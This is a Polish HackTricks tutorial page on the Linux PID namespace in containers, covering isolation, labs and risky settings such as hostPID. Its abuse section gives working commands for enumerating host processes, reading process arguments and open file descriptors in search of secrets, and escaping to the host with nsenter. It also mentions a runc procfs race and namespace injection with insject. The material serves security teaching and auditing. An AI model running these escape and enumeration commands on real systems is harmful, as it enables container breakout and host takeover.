# Przestrzeń nazw PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw PID kontroluje sposób numerowania procesów oraz to, które procesy są widoczne. Dzięki temu kontener może mieć własny PID 1, mimo że nie jest prawdziwą maszyną. Wewnątrz przestrzeni nazw workload widzi coś, co wygląda jak lokalne drzewo procesów. Poza przestrzenią nazw host nadal widzi rzeczywiste PID-y hosta oraz pełny obraz procesów.

Z punktu widzenia bezpieczeństwa przestrzeń nazw PID ma znaczenie, ponieważ widoczność procesów jest cenna. Gdy workload może zobaczyć procesy hosta, może być w stanie obserwować nazwy usług, argumenty wiersza poleceń, sekrety przekazane w argumentach procesów, stan wynikający ze zmiennych środowiskowych za pośrednictwem `/proc` oraz potencjalne cele wejścia do przestrzeni nazw. Jeśli może zrobić więcej niż tylko zobaczyć te procesy, na przykład wysyłać sygnały lub używać ptrace w odpowiednich warunkach, problem staje się znacznie poważniejszy.

## Działanie

Nowa przestrzeń nazw PID rozpoczyna działanie z własnym wewnętrznym numerowaniem procesów. Pierwszy proces utworzony wewnątrz niej staje się PID 1 z punktu widzenia tej przestrzeni nazw, co oznacza również, że otrzymuje specjalną semantykę podobną do init w zakresie osieroconych procesów potomnych i obsługi sygnałów. Wyjaśnia to wiele osobliwości kontenerów związanych z procesami init, zbieraniem procesów zombie oraz tym, dlaczego w kontenerach czasami używa się małych wrapperów init.

Istotna lekcja z zakresu bezpieczeństwa jest taka, że proces może wyglądać na odizolowany, ponieważ widzi tylko własne drzewo PID, ale izolacja ta może zostać celowo usunięta. Docker udostępnia tę funkcję za pomocą `--pid=host`, natomiast Kubernetes robi to przez `hostPID: true`. Gdy kontener dołącza do przestrzeni nazw PID hosta, workload widzi bezpośrednio procesy hosta, a wiele kolejnych ścieżek ataku staje się znacznie bardziej realistycznych.

## Lab

Aby ręcznie utworzyć przestrzeń nazw PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Powłoka widzi teraz prywatny widok procesów. Flaga `--mount-proc` jest istotna, ponieważ montuje instancję procfs odpowiadającą nowej przestrzeni nazw PID, dzięki czemu lista procesów jest spójna od wewnątrz.

Aby porównać zachowanie kontenera:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Różnica jest natychmiastowa i łatwa do zrozumienia, dlatego jest to dobre pierwsze laboratorium dla czytelników.

## Użycie w runtime

Standardowe kontenery w Docker, Podman, containerd i CRI-O otrzymują własną przestrzeń nazw PID. Kubernetes Pods zwykle również otrzymują izolowany widok PID, chyba że workload jawnie zażąda współdzielenia PID hosta. Środowiska LXC/Incus opierają się na tej samej funkcji kernela, choć przypadki użycia system-container mogą ujawniać bardziej złożone drzewa procesów i zachęcać do stosowania większej liczby skrótów debugowania.

Ta sama zasada obowiązuje wszędzie: jeśli runtime zdecydował się nie izolować przestrzeni nazw PID, oznacza to celowe osłabienie granicy kontenera.

## Błędne konfiguracje

Najbardziej typową błędną konfiguracją jest współdzielenie PID hosta. Zespoły często uzasadniają je wygodą debugowania, monitorowania lub zarządzania usługami, ale zawsze należy traktować je jako istotny wyjątek bezpieczeństwa. Nawet jeśli kontener nie ma bezpośredniej możliwości zapisu do procesów hosta, sama widoczność może ujawnić wiele informacji o systemie. Po dodaniu capabilities takich jak `CAP_SYS_PTRACE` lub użytecznego dostępu do procfs ryzyko znacznie wzrasta.

Kolejnym błędem jest założenie, że skoro workload domyślnie nie może zabijać procesów hosta ani używać wobec nich ptrace, to współdzielenie PID hosta jest nieszkodliwe. Taki wniosek pomija wartość enumeracji, dostępność celów do wejścia do namespace oraz sposób, w jaki widoczność PID łączy się z innymi osłabionymi mechanizmami kontroli.

## Abuse

Jeśli przestrzeń nazw PID hosta jest współdzielona, attacker może przeglądać procesy hosta, pozyskiwać argumenty procesów, identyfikować interesujące usługi, znajdować potencjalne PID-y dla `nsenter` lub łączyć widoczność procesów z uprawnieniami związanymi z ptrace, aby ingerować w workloady hosta lub sąsiednie workloady. W niektórych przypadkach samo zauważenie odpowiedniego, długo działającego procesu wystarcza, aby zmienić dalszy plan ataku.

Pierwszym praktycznym krokiem jest zawsze potwierdzenie, że procesy hosta są rzeczywiście widoczne:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Gdy identyfikatory PID hosta są widoczne, argumenty procesów i cele wejścia do przestrzeni nazw często stają się najbardziej użytecznym źródłem informacji:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Jeśli `nsenter` jest dostępne i istnieją wystarczające uprawnienia, sprawdź, czy widoczny proces hosta może posłużyć jako most między namespace’ami:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Nawet gdy wejście jest zablokowane, współdzielenie PID-ów hosta jest już wartościowe, ponieważ ujawnia układ usług, komponenty środowiska uruchomieniowego oraz potencjalne uprzywilejowane procesy, które można następnie obrać za cel.

Widoczność PID-ów hosta sprawia również, że nadużywanie deskryptorów plików staje się bardziej realistyczne. Jeśli uprzywilejowany proces hosta lub sąsiedni workload ma otwarty wrażliwy plik albo socket, atakujący może być w stanie sprawdzić `/proc/<pid>/fd/` i ponownie użyć tego uchwytu — zależnie od właściciela, opcji montowania procfs oraz modelu docelowej usługi.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Te polecenia są przydatne, ponieważ pokazują, czy `hidepid=1` lub `hidepid=2` ogranicza widoczność między procesami oraz czy widoczne są w ogóle oczywiście interesujące deskryptory, takie jak otwarte pliki z sekretami, logi lub gniazda Unix.

### Pełny przykład: host PID + `nsenter`

Współdzielenie host PID staje się bezpośrednim host escape, gdy proces ma również wystarczające uprawnienia do dołączenia do namespace’ów hosta:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Jeśli polecenie zakończy się powodzeniem, proces kontenera wykonuje się teraz w hostowych przestrzeniach nazw mount, UTS, network, IPC i PID. Skutkiem jest natychmiastowe przejęcie hosta.

Nawet gdy brakuje samego `nsenter`, ten sam rezultat można osiągnąć za pośrednictwem pliku binarnego hosta, jeśli system plików hosta jest zamontowany:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Najnowsze uwagi dotyczące runtime

Niektóre ataki związane z PID namespace nie wynikają z tradycyjnych błędnych konfiguracji `hostPID: true`, lecz z błędów implementacyjnych runtime dotyczących sposobu stosowania zabezpieczeń procfs podczas konfiguracji kontenera.

#### `maskedPaths` race do host procfs

W podatnych wersjach `runc` atakujący mogący kontrolować obraz kontenera lub workload `runc exec` mogli wykorzystać race w fazie maskowania, zastępując `/dev/null` po stronie kontenera symlinkiem wskazującym na wrażliwą ścieżkę procfs, taką jak `/proc/sys/kernel/core_pattern`. Jeśli race się powiódł, bind mount masked-path mógł trafić do niewłaściwego celu i udostępnić nowemu kontenerowi globalne dla hosta ustawienia procfs.

Przydatna komenda do review:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Jest to istotne, ponieważ ostateczny wpływ może być taki sam jak w przypadku bezpośredniej ekspozycji procfs: zapisywalne `core_pattern` lub `sysrq-trigger`, a następnie wykonanie kodu na hoście albo odmowa usługi.

#### Wstrzykiwanie do namespace za pomocą `insject`

Narzędzia do wstrzykiwania do namespace, takie jak `insject`, pokazują, że interakcja z PID-namespace nie zawsze wymaga wcześniejszego wejścia do docelowego namespace przed utworzeniem procesu. Helper może dołączyć później, użyć `setns()` i wykonać kod, zachowując widoczność docelowej przestrzeni PID:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ten rodzaj techniki ma znaczenie głównie w zaawansowanym debugowaniu, offensive tooling oraz workflow post-exploitation, w których kontekst namespace musi zostać dołączony po zakończeniu inicjalizacji workloadu przez runtime.

### Powiązane wzorce nadużywania FD

Warto wyraźnie wskazać dwa wzorce, gdy widoczne są PID-y hosta. Po pierwsze, uprzywilejowany proces może utrzymywać otwarty wrażliwy file descriptor podczas `execve()`, ponieważ nie został on oznaczony jako `O_CLOEXEC`. Po drugie, usługi mogą przekazywać file descriptory przez Unix sockets za pośrednictwem `SCM_RIGHTS`. W obu przypadkach interesującym obiektem nie jest już pathname, lecz już otwarty handle, który proces o niższych uprawnieniach może odziedziczyć lub otrzymać.

Ma to znaczenie podczas pracy z kontenerami, ponieważ handle może wskazywać na `docker.sock`, uprzywilejowany log, plik z sekretem hosta lub inny obiekt o wysokiej wartości, nawet jeśli sama ścieżka nie jest bezpośrednio dostępna z filesystemu kontenera.

## Sprawdzenia

Celem tych poleceń jest ustalenie, czy proces ma prywatny widok PID, czy może już wyliczać znacznie szerszy krajobraz procesów.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Co jest tutaj interesujące:

- Jeśli lista procesów zawiera oczywiste usługi hosta, współdzielenie PID hosta jest prawdopodobnie już aktywne.
- Widoczność tylko niewielkiego drzewa lokalnego dla kontenera to normalna wartość bazowa; obecność `systemd`, `dockerd` lub niezwiązanych demonów już nią nie jest.
- Gdy widoczne są PID-y hosta, nawet informacje o procesach dostępne tylko do odczytu stają się użyteczne w ramach rozpoznania.

Jeśli wykryjesz kontener działający ze współdzieleniem PID hosta, nie traktuj tego jako kosmetycznej różnicy. To poważna zmiana w zakresie tego, co workload może obserwować i potencjalnie na co wpływać.
{{#include ../../../../../banners/hacktricks-training.md}}
